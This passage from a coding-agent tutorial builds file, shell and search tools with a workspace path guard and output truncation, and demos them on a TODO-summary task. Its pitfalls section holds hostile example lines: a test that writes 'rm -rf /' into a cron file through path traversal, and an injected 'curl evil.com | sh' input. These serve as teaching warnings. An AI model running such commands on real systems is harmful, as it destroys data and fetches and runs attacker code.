    global WORKSPACE_ROOT
    if workspace is not None:
        WORKSPACE_ROOT = workspace.resolve()

    registry = ToolRegistry()
    for fn in (read_file, write_file, edit_file, bash, glob, grep, list_dir):
        registry.register(fn)
    return registry
```

The `ToolRegistry` class from Phase 2 already knows how to produce the flat tool-schema
list and dispatch by name. All we do here is register every `@tool`-decorated function.
The `@tool` decorator extracted the JSON schema from type hints and the docstring when
the function was defined, so there is nothing more to do.

### ▶ Check it now (no API key needed)

You have now seen every piece of Version 3. Paste the assembled module from the
[end-of-phase reference listing](#version-3-reference--the-complete-coding_toolspy)
into `coding_tools.py` (next to Phase 2's `tools/` package, per the Step 3.0 layout),
then run the six-line offline smoke test that accompanies that listing:

```bash
python smoke_test_tools.py
```

You should see:

```text
7
Directory: .  (1 dirs, 2 files) ...
ERROR: File not found: nope.txt
```

The script itself and a walkthrough of the expected output sit right under the
reference listing — no API key, no model call, just proof that the registry and all
seven tools are wired.

---

## Toolset reference table

| Tool | Signature | Purpose | Risk level |
|------|-----------|---------|------------|
| `read_file` | `(path, offset=0, limit=2000)` | Read text file with line numbers, support paging | Low |
| `write_file` | `(path, content)` | Create or overwrite a file entirely | Medium — destructive |
| `edit_file` | `(path, old_string, new_string, replace_all=False)` | Surgical exact-match replacement | Medium — destructive |
| `bash` | `(command, timeout=120)` | Execute any shell command | **High** — arbitrary execution |
| `glob` | `(pattern, path=".")` | Find files by glob pattern | Low |
| `grep` | `(pattern, path=".", glob_filter=None)` | Search file contents by regex | Low |
| `list_dir` | `(path=".")` | List directory contents | Low |

---

## Step 3.3 — the end-to-end demo

The following demo is **Version 3 running end-to-end**: it wires the tool registry into
the agent loop you built in Phase 3 (the plain, non-streaming form — swapping in
Phase 3's streaming variant is a good exercise, but it would only change how the text
arrives, not what the agent does) and sends the agent a real task — find all TODO
comments in a small project and summarize them.

### Demo setup

```python
# demo_phase4.py
"""
End-to-end demo: an agent finds and summarizes TODO comments in a project.

Prerequisites (see the Step 3.0 bridge for the folder layout):
  - Phase 2's tools/ package in the same folder
  - coding_tools.py next to it (the complete end-of-phase reference module)
  - pip install openai
  - export OPENAI_API_KEY=sk-...
"""

import pathlib
import tempfile
import textwrap
import json

from openai import OpenAI
from coding_tools import make_default_registry   # the reference module (pulls in Phase 2)

# ── Create a toy project for the agent to explore ────────────────────────────

def create_sample_project(root: pathlib.Path) -> None:
    """Write a few Python files with TODO comments."""
    (root / "src").mkdir()
    (root / "tests").mkdir()

    (root / "src" / "auth.py").write_text(textwrap.dedent("""\
        # TODO: add rate limiting to login endpoint
        def login(username, password):
            # TODO: hash the password before comparing
            return username == "admin" and password == "secret"

        def logout(session_id):
            pass  # TODO: invalidate session in Redis
    """))

    (root / "src" / "api.py").write_text(textwrap.dedent("""\
        # TODO: switch to async handlers for better throughput
        def handle_request(req):
            return {"status": "ok"}
    """))

    (root / "tests" / "test_auth.py").write_text(textwrap.dedent("""\
        from src.auth import login

        def test_login_ok():
            assert login("admin", "secret")

        # TODO: add negative test cases
    """))

    (root / "README.md").write_text("# Sample Project\n")
```

### The demo agent loop

```python
def run_demo():
    client = OpenAI()

    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir)
        create_sample_project(root)

        registry = make_default_registry(workspace=root)

        system_prompt = (
            "You are a coding assistant operating on a Python project. "
            "Use the available tools to explore the codebase. "
            "When you have gathered all the information you need, "
            "produce a final answer — do not call any more tools after that."
        )

        task = (
            "Find every TODO comment in this project's source files and "
            "produce a concise summary grouped by file. "
            "Then suggest which TODO is most urgent and why."
        )

        input_items = [
            {"role": "user", "content": task},
        ]

        print(f"TASK: {task}\n{'='*60}")

        iteration = 0
        max_iterations = 20   # the same runaway-loop cap Phase 2 called max_turns —
                              # renamed because one iteration can answer several tool calls
        got_final_answer = False

        while iteration < max_iterations:
            iteration += 1

            resp = client.responses.create(
                model="gpt-4o",
                instructions=system_prompt,
                input=input_items,
                tools=registry.to_openai_schema(),
                tool_choice="auto",
            )

            # Append the model's output to the transcript.
            for item in resp.output:
                input_items.append(
                    item.model_dump() if hasattr(item, "model_dump") else item
                )

            # Check for tool calls.
            tool_calls = [
                item for item in resp.output
                if getattr(item, "type", None) == "function_call"
            ]

            if not tool_calls:
                # No tool calls → the model produced a final answer.
                for item in resp.output:
                    if getattr(item, "type", None) == "message":
                        for block in item.content:
                            if getattr(block, "type", None) == "output_text":
                                print(f"\nAGENT ANSWER:\n{block.text}")
                got_final_answer = True
                break

            # Execute each tool call and append results.
            for tc in tool_calls:
                args = json.loads(tc.arguments) if isinstance(tc.arguments, str) else tc.arguments
                print(f"\n[Tool call] {tc.name}({json.dumps(args, ensure_ascii=False)[:120]})")
                # Phase 2's dispatch wants the RAW JSON string (tc.arguments) —
                # it does its own json.loads and validation.  Don't pre-parse.
                result = registry.dispatch(tc.name, tc.arguments)
                preview = result[:200].replace("\n", " ")
                print(f"[Result]   {preview}{'...' if len(result) > 200 else ''}")

                input_items.append({
                    "type": "function_call_output",
                    "call_id": tc.call_id,
                    "output": result,
                })

        # A flag, not `iteration >= max_iterations`: an answer that arrives on
        # exactly the last iteration would otherwise print this error too.
        if not got_final_answer:
            print("ERROR: max_iterations reached without a final answer.")


if __name__ == "__main__":
    run_demo()
```

### ▶ Run it now

This is Version 3's full checkpoint. It needs exactly three things side by side (the
Step 3.0 layout): Phase 2's `tools/` package, `coding_tools.py` (the complete module in
the [end-of-phase reference listing](#version-3-reference--the-complete-coding_toolspy)
— paste it now if you haven't yet), and this `demo_phase4.py`.

```bash
export OPENAI_API_KEY=sk-...
python demo_phase4.py
```

You should see a transcript like the one below. (Want to check the wiring
*before* spending an API call? The offline smoke test under the reference listing
exercises the registry and tools with no key at all.)

### Transcript (representative output)

The exact sequence varies by model run, but a typical execution looks like this:

```text
TASK: Find every TODO comment in this project's source files and produce a
concise summary grouped by file. Then suggest which TODO is most urgent and why.
============================================================

[Tool call] list_dir({"path": "."})
[Result]   Directory: .  (2 dirs, 1 files)  D  src/  D  tests/  F  README.md ...

[Tool call] grep({"pattern": "TODO", "path": ".", "glob_filter": "*.py"})
[Result]   src/auth.py:1: # TODO: add rate limiting to login endpoint  src/auth.py:3: ...

[Tool call] read_file({"path": "src/auth.py"})
[Result]   File: src/auth.py  (lines 1–7 of 7)    1  # TODO: add rate limiting ...

AGENT ANSWER:
## TODO Summary

**src/auth.py** (3 TODOs)
- Line 1: Add rate limiting to the login endpoint
- Line 3: Hash the password before comparing (currently stored in plaintext)
- Line 6: Invalidate session in Redis on logout

**src/api.py** (1 TODO)
- Line 1: Switch to async handlers for better throughput

**tests/test_auth.py** (1 TODO)
- Line 7: Add negative test cases for login

---
**Most urgent:** `src/auth.py` line 3 — comparing passwords without hashing is a
critical security vulnerability. Any data breach would expose credentials in plaintext.
This should be fixed before any of the other items.
```

Notice the tool-call sequence: `list_dir` first (orient in the workspace), then `grep`
(find all matches in one call rather than reading every file), then a targeted
`read_file` for context. A well-prompted model with good tools naturally follows an
efficient search strategy.

---

## Deep dive — output-size discipline

The `_truncate` helper appears in every tool that reads file contents or command output.
This section explains why it is non-negotiable.

### The context-window economy

Every token in the context window is a shared resource competed for by:

- The system prompt (sets behaviour).
- The conversation history (gives context).
- Tool call arguments (the model's intent).
- **Tool results (what we control).**
- The model's reasoning and output (what we want).

When tool results are large, they crowd out everything else. A single `cat` of a 50,000-
line file consumes ~50,000 tokens — the entire context window of GPT-3.5, most of
GPT-4's. The model then either truncates its own reasoning to fit, or the API silently
drops early history items, causing the model to forget it had a plan.

### The truncation contract

`_truncate` enforces two limits:
- **`max_chars = 40,000`** — roughly 10,000 tokens at 4 chars/token. Generous enough
  for almost all real tool results; tight enough to never blow the budget alone.
- **`max_lines = 2,000`** — a file with 2,000 lines is already large; the model should
  use offset/limit to page rather than reading everything.

Both limits emit a visible notice so the model knows output was cut:

```text
[... output truncated at 2000 lines ...]
```

This is the correct behaviour. Silently truncating without a notice would cause the model
to believe it has the full output when it does not, producing hallucinated reasoning. The
notice tells it to ask for more if it needs it.

### Foreshadowing Phase 6

Phase 6 covers context compaction: strategies for summarizing old tool results before
they crowd out current reasoning, sliding-window approaches, and the `max_output_tokens`
budget. `_truncate` is the per-call first line of defence; Phase 6 is the session-level
second line. Both are necessary.

---

## Version 3 reference — the complete `coding_tools.py`

> **Reference copy.** Assembled unchanged, in dependency order, from the production
> forms above (which are themselves Steps 2.0–2.6 plus the `@tool` upgrade). Nothing
> new to type here beyond pasting it whole — skim or skip. The maintained version lives
> in [code/agent_harness/tools/files.py](./code/agent_harness/tools/files.py) and
> [shell.py](./code/agent_harness/tools/shell.py).

For reference, here is the full Version 3 module with all pieces assembled in dependency
order. Together with the `tools/` package you built in Phase 2 and the `demo_phase4.py`
harness from Step 3.3, this is the complete runnable Version 3 program (see the
Step 3.0 bridge for the three-file folder layout):

```python
# coding_tools.py  — Phase 4: Real-world coding-agent tools
# Needs: Phase 2's tools/ package in the same folder.
from __future__ import annotations

import fnmatch
import os
import pathlib
import re
import subprocess

from tools import tool, ToolRegistry   # Phase 2's tools/ package

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

WORKSPACE_ROOT: pathlib.Path = pathlib.Path(os.getcwd()).resolve()

_DEFAULT_MAX_CHARS = 40_000
_DEFAULT_MAX_LINES = 2_000

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _safe_path(user_path: str) -> pathlib.Path:
    p = pathlib.Path(user_path)
    if p.is_absolute():
        rel = pathlib.Path(*p.parts[1:])
        p = WORKSPACE_ROOT / rel
    else:
        p = WORKSPACE_ROOT / p
    resolved = p.resolve()
    try:
        resolved.relative_to(WORKSPACE_ROOT)
    except ValueError:
        raise ValueError(
            f"Path '{user_path}' resolves to '{resolved}' which is outside "
            f"the workspace root '{WORKSPACE_ROOT}'."
        )
    return resolved


def _truncate(
    text: str,
    max_chars: int = _DEFAULT_MAX_CHARS,
    max_lines: int = _DEFAULT_MAX_LINES,
    label: str = "output",
) -> str:
    lines = text.splitlines(keepends=True)
    if len(lines) > max_lines:
        lines = lines[:max_lines]
        text = "".join(lines)
        text += f"\n[... {label} truncated at {max_lines} lines ...]"
    if len(text) > max_chars:
        text = text[:max_chars]
        text += f"\n[... {label} truncated at {max_chars} chars ...]"
    return text


def _human_size(n: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"

# ---------------------------------------------------------------------------
# Tools
# ---------------------------------------------------------------------------

@tool
def read_file(path: str, offset: int = 0, limit: int = 2000) -> str:
    """
    Read a text file and return its contents with line numbers.

    Args:
        path:   Path to the file, relative to the workspace root.
        offset: First line to return (0-indexed).  Default 0 (start of file).
        limit:  Maximum number of lines to return.  Default 2000.

    Returns:
        File contents formatted as 'lineN\\tcontent'.  ERROR string on failure.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"
    try:
        raw = p.read_bytes()
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"
    if b"\x00" in raw[:8192]:
        return f"ERROR: '{path}' appears to be binary ({len(raw)} bytes)."
    text = raw.decode("utf-8", errors="replace")
    lines = text.splitlines()
    total = len(lines)
    sliced = lines[offset : offset + limit]
    if not sliced:
        return f"File '{path}' has {total} lines; offset={offset} is past end."
    w = len(str(offset + len(sliced)))
    numbered = "\n".join(
        f"{offset + i + 1:{w}d}\t{line}" for i, line in enumerate(sliced)
    )
    header = f"File: {path}  (lines {offset+1}–{offset+len(sliced)} of {total})\n"
    return _truncate(header + numbered, label=f"read_file({path})")


@tool
def write_file(path: str, content: str) -> str:
    """
    Write content to a file, creating it (and parent dirs) if needed.

    Args:
        path:    Path to the file, relative to the workspace root.
        content: Full UTF-8 text content to write.

    Returns:
        Confirmation string, or ERROR.  WARNING: destructive — overwrites existing files.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        encoded = content.encode("utf-8")
        p.write_bytes(encoded)
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"
    return f"Wrote {len(encoded)} bytes ({content.count(chr(10))} lines) to '{path}'."


@tool
def edit_file(path: str, old_string: str, new_string: str, replace_all: bool = False) -> str:
    """
    Replace an exact string in a file with a new string.

    Args:
        path:        File path relative to workspace root.
        old_string:  Exact text to find.  Must be unique unless replace_all=True.
        new_string:  Replacement text.
        replace_all: Replace all occurrences if True.  Default False.

    Returns:
        Confirmation, or ERROR if old_string is not found or is ambiguous.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"
    try:
        original = p.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"
    count = original.count(old_string)
    if count == 0:
        snippet = repr(old_string[:120]) + ("..." if len(old_string) > 120 else "")
        return (
            f"ERROR: old_string not found in '{path}'.\n"
            f"Searched for: {snippet}\n"
            "Check whitespace and indentation exactly match the file."
        )
    if count > 1 and not replace_all:
        return (
            f"ERROR: old_string is ambiguous — found {count} occurrences in '{path}'. "
            "Provide more context to make it unique, or pass replace_all=True."
        )
    updated = original.replace(old_string, new_string)
    try:
        p.write_text(updated, encoding="utf-8")
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"
    reps = count if replace_all else 1
    delta = len(updated.splitlines()) - len(original.splitlines())
    return (
        f"Edited '{path}': replaced {reps} occurrence(s). "
        f"File now has {len(updated.splitlines())} lines "
        f"({'+' if delta >= 0 else ''}{delta} from before)."
    )


@tool
def bash(command: str, timeout: int = 120) -> str:
    """
    Run a shell command and return its combined stdout+stderr output.

    Args:
        command: Shell command to run under /bin/sh.  Pipes, redirects, and
                 shell features work.  stdin is closed so interactive commands
                 will fail immediately rather than hanging.
        timeout: Seconds before the command is killed.  Default 120.

    Returns:
        'Exit code: N\\n---\\n<output>' or ERROR on timeout/failure.

    WARNING: Executes arbitrary code.  Do not pass unsanitised user input.
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=str(WORKSPACE_ROOT),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
        )
        output = result.stdout.decode("utf-8", errors="replace")
        output = _truncate(output, label=f"bash({command[:60]})")
        return f"Exit code: {result.returncode}\n---\n{output}"
    except subprocess.TimeoutExpired:
        return f"ERROR: Command timed out after {timeout} seconds: {command}"
    except OSError as exc:
        return f"ERROR: Failed to start command: {exc}"


@tool
def glob(pattern: str, path: str = ".") -> str:
    """
    Find files matching a glob pattern.

    Args:
        pattern: Glob pattern, e.g. '**/*.py', '*.md'.  '**' is recursive.
        path:    Directory to search, relative to workspace root.  Default '.'.

    Returns:
        Sorted, newline-separated list of matching file paths (relative to
        workspace root).  Capped at 500 results.
    """
    _MAX = 500
    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not base.exists():
        return f"ERROR: Directory not found: {path}"
    if not base.is_dir():
        return f"ERROR: Not a directory: {path}"
    try:
        # Path.glob handles '**' natively, so '**/*.py' recurses as advertised.
        matches = list(base.glob(pattern))
    except (OSError, ValueError) as exc:
        return f"ERROR: Glob failed: {exc}"
    files = sorted([m for m in matches if m.is_file()], key=str)
    truncated = len(files) > _MAX
    files = files[:_MAX]
    if not files:
        return f"No files match '{pattern}' under '{path}'."
    rel = []
    for f in files:
        try:
            rel.append(str(f.relative_to(WORKSPACE_ROOT)))
        except ValueError:
            rel.append(str(f))
    result = "\n".join(rel)
    if truncated:
        result += f"\n[... capped at {_MAX} results ...]"
    return result


@tool
def grep(pattern: str, path: str = ".", glob_filter: str | None = None) -> str:
    """
    Search file contents for a regular expression.

    Args:
        pattern:     Python regex pattern.  Case-sensitive.  Use (?i) prefix
                     for case-insensitive search.
        path:        File or directory to search, relative to workspace root.
                     Directories are searched recursively.  Default '.'.
        glob_filter: If given, only files whose name matches this glob are
                     searched, e.g. '*.py'.

    Returns:
        Matching lines as 'filepath:linenum: content'.  Capped at 200 matches.
    """
    _MAX = 200
    _MAX_FILE = 5 * 1024 * 1024
    try:
        compiled = re.compile(pattern)
    except re.error as exc:
        return f"ERROR: Invalid regex: {exc}"
    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not base.exists():
        return f"ERROR: Path not found: {path}"
    files = [base] if base.is_file() else sorted(
        [f for f in base.rglob("*") if f.is_file()], key=str
    )
    if glob_filter:
        files = [f for f in files if fnmatch.fnmatch(f.name, glob_filter)]
    results, skipped_bin, skipped_large = [], 0, 0
    for filepath in files:
        if len(results) >= _MAX:
            break
        try:
            size = filepath.stat().st_size
        except OSError:
            continue
        if size > _MAX_FILE:
            skipped_large += 1
            continue
        try:
            raw = filepath.read_bytes()
        except OSError:
            continue
        if b"\x00" in raw[:8192]:
            skipped_bin += 1
            continue
        text = raw.decode("utf-8", errors="replace")
        for lineno, line in enumerate(text.splitlines(), 1):
            if len(results) >= _MAX:
                break
            if compiled.search(line):
                try:
                    rel = str(filepath.relative_to(WORKSPACE_ROOT))
                except ValueError:
                    rel = str(filepath)
                display = line[:300] + ("..." if len(line) > 300 else "")
                results.append(f"{rel}:{lineno}: {display}")
    if not results:
        return f"No matches for '{pattern}' under '{path}'."
    output = "\n".join(results)
    notes = []
    if len(results) >= _MAX:
        notes.append(f"capped at {_MAX} results")
    if skipped_bin:
        notes.append(f"{skipped_bin} binary file(s) skipped")
    if skipped_large:
        notes.append(f"{skipped_large} large file(s) skipped")
    if notes:
        output += "\n[" + "; ".join(notes) + "]"
    return output


@tool
def list_dir(path: str = ".") -> str:
    """
    List the contents of a directory.

    Args:
        path: Directory path relative to workspace root.  Default '.'.

    Returns:
        One entry per line: 'D  name/' for directories, 'F  name  size' for
        files.  Directories listed before files, both alphabetically sorted.
    """
    _MAX = 300
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: Not found: {path}"
    if p.is_file():
        return f"ERROR: '{path}' is a file; use read_file() to read it."
    try:
        entries = list(p.iterdir())
    except OSError as exc:
        return f"ERROR: {exc}"
    dirs = sorted([e for e in entries if e.is_dir()], key=lambda e: e.name.lower())
    files = sorted([e for e in entries if e.is_file()], key=lambda e: e.name.lower())
    ordered = (dirs + files)[:_MAX]
    lines = []
    for e in ordered:
        if e.is_dir():
            lines.append(f"D  {e.name}/")
        else:
            try:
                size = _human_size(e.stat().st_size)
            except OSError:
                size = "?"
            lines.append(f"F  {e.name:<40s}  {size:>8s}")
    header = f"Directory: {path}  ({len(dirs)} dirs, {len(files)} files)\n"
    result = header + "\n".join(lines)
    if len(dirs) + len(files) > _MAX:
        result += f"\n[... capped at {_MAX} entries ...]"
    return result

# ---------------------------------------------------------------------------
# Factory
# ---------------------------------------------------------------------------

def make_default_registry(workspace: pathlib.Path = None) -> ToolRegistry:
    """
    Return a ToolRegistry pre-loaded with all coding-agent tools.

    Args:
        workspace: Override WORKSPACE_ROOT.  Defaults to cwd at import time.
    """
    global WORKSPACE_ROOT
    if workspace is not None:
        WORKSPACE_ROOT = workspace.resolve()
    registry = ToolRegistry()
    for fn in (read_file, write_file, edit_file, bash, glob, grep, list_dir):
        registry.register(fn)
    return registry
```

### ▶ Check it now (no API key needed)

Before wiring the model in, prove the module and the Phase 2 registry are talking to
each other. With `coding_tools.py` saved next to your Phase 2 `tools/` package, save and
run this four-line smoke test from the same folder:

```python
# smoke_test_tools.py — checks the Version 3 wiring offline
from coding_tools import make_default_registry

registry = make_default_registry()
print(len(registry.to_openai_schema()))                           # 7 — one schema per tool
print(registry.dispatch("list_dir", '{"path": "."}')[:200])       # your folder listing
print(registry.dispatch("read_file", '{"path": "nope.txt"}'))     # ERROR: File not found...
```

```bash
python smoke_test_tools.py
```

Note the second argument to `dispatch` is a **JSON string**, exactly what the model
sends as `tc.arguments`. If you see the count `7`, a directory listing, and a clean
`ERROR:` string (not a traceback), Version 3 is fully wired — `demo_phase4.py` in
Step 3.3 is the same plumbing plus the model.

(Experiment further and you will notice two error spellings living side by side:
this module's tools return `"ERROR: ..."` — design principle (d) from the start of
this phase — while
Phase 2's registry says `"Error: ..."` for *its* failures: unknown tool, bad JSON,
an exception escaping a tool. The model reads either just fine; Phase 5 acknowledges
and reconciles the mismatch.)

---

## What comes next

This phase gave the agent hands: it can now read any file in its workspace, make
surgical edits, run shell commands, and search the codebase efficiently. But with great
power comes great risk — `bash` is an unrestricted code-execution interface and
`write_file` is irreversible.

**Phase 5 — Permissions and the Human-in-the-Loop** introduces a permission layer that
sits between the agent loop and tool dispatch. Every call to a "dangerous" tool (bash,
write_file, edit_file) surfaces a human-readable preview and waits for explicit user
approval before executing. The agent harness stays unchanged; the permission system is
a thin wrapper around `registry.dispatch`.

**Phase 6 — Context Management** addresses what happens when a long agentic session
fills the context window: how to summarize stale tool results, implement a sliding
window over the transcript, and use `max_output_tokens` budgeting to keep the model
reasoning clearly across hundreds of tool calls.

---

## Pitfalls

> This section documents the most common failure modes when building agent tools. Each
> one has burned at least one production system.

### Path Traversal

**Symptom:** The model passes `path="../../../etc/passwd"` or an absolute path like
`/etc/shadow`. Without a guard, `write_file` happily overwrites it.

**Fix:** `_safe_path()` — every path tool call goes through it. The guard uses
`Path.resolve()` to follow symlinks and then checks that the result is relative to
`WORKSPACE_ROOT`. There is no edge case in which a relative path with `..` or a symlink
chain can escape.

**Test it:**

```python
# This should return an ERROR string, not write anything.
result = write_file("../../etc/cron.d/evil", "* * * * * rm -rf /")
assert result.startswith("ERROR:")
```

### Reading Huge Files

**Symptom:** The model calls `read_file("node_modules/big_lib/dist/bundle.js")` and
gets 80,000 lines of minified JavaScript, consuming the entire context window.

**Fix:** The `limit=2000` default and `_truncate` backstop. For intentionally large
files, `offset`/`limit` pagination is the right pattern. Teach the model (in the system
prompt or tool description) to read in windows rather than pulling entire files.

### Edit Ambiguity

**Symptom:** The model calls `edit_file` with `old_string="pass"` thinking there is one
such line. The file has 40 functions with `pass` as a body. The tool returns an ambiguity
error.

**Fix:** The uniqueness check in `edit_file`. The model must provide enough surrounding
context (e.g., the full function signature plus the body) to make `old_string` unique.
The error message says "found N occurrences" so the model knows exactly why it failed
and what to do.

### Command Injection

**Symptom:** User input is interpolated into a `bash` command:
`bash(f"grep {user_query} src/")`. User types `'; curl evil.com | sh; #'`.

**Fix:** Never interpolate unsanitised user input into shell commands. In a coding
agent, the model constructs commands — not the end user directly. The Phase 5 permission
layer adds a human-approval step for `bash` calls. If you need to pass user data to a
command, use `subprocess.run([...], shell=False)` with a properly escaped argument list,
or sanitise the input yourself.

### Blocking on Interactive Commands

**Symptom:** The model calls `bash("python3 -i")` trying to start a REPL. The process
waits for stdin forever. The timeout fires after 120 seconds.

**Fix:** `stdin=subprocess.DEVNULL` ensures the process sees EOF immediately if it
tries to read. The docstring warns the model explicitly: "Interactive commands will
hang. Use non-interactive invocations." Also, 120 seconds is generous — for quick
operations lower the timeout to 30 seconds.

### Encoding Errors

**Symptom:** A source file contains a Latin-1 byte sequence (e.g., a comment with an
accented character in an old codebase). `p.read_text(encoding="utf-8")` raises
`UnicodeDecodeError`. The tool crashes — or would, if we did not handle it.

**Fix:** Every read in this module uses `errors='replace'`. This substitutes the
Unicode replacement character (U+FFFD) for undecodable bytes. The model sees the file
with `?`-like markers instead of a hard error. For truly binary files the null-byte
heuristic fires first. This is the correct approach: never crash on encoding issues in
a tool; always return something the model can reason about.

---

## Key takeaways

- **Tools define the agent's power.** `read_file`, `edit_file`, `bash`, `grep`, and
  `glob` are what turn the bare loop into a coding agent.
- Every tool shares the same **discipline**: keep paths inside the workspace, return
  **error strings** instead of raising, and practice **output-size discipline** —
  truncate/paginate so one big result can't swamp the context window.
- **`make_default_registry()`** wires the whole toolset together in one place, so the
  loop just dispatches by name.
- The genuinely **risky** tools (writing files, running shell) are exactly where
  Phase 5's permission layer plugs in — the harness itself stays unchanged.

## Check yourself

1. Name three tools that turn the loop into a coding agent.
2. Why is truncating/paginating tool output a correctness concern, not just cosmetics?
3. What should a tool do when it's handed a missing file or a path outside the workspace?
4. Where is the full toolset assembled for the agent to use?

<details><summary>Answers</summary>

1. Any three of `read_file`, `edit_file`, `bash`, `grep`, `glob`.
2. Oversized output **crowds out conversation history** in the context window, degrading
   the model's reasoning — so bounded output keeps long sessions coherent.
3. Return a **clear error string** (not raise) and refuse paths that escape the
   workspace root — so the model can see the problem and the harness stays safe.
4. In **`make_default_registry()`**.
</details>

**Practice first:** before moving on, try the
[Phase 4 exercises](./EXERCISES.md#phase-4--real-tools) — they extend the toolset you
just built (and you can start from your `harness_v2.py` or the Version 3 module,
whichever feels more comfortable).

**Next:** [Phase 5 — Permissions, Safety & the Hook System](./05-permissions-and-safety.md)
— the layer that decides which of these tool calls is actually allowed to run.
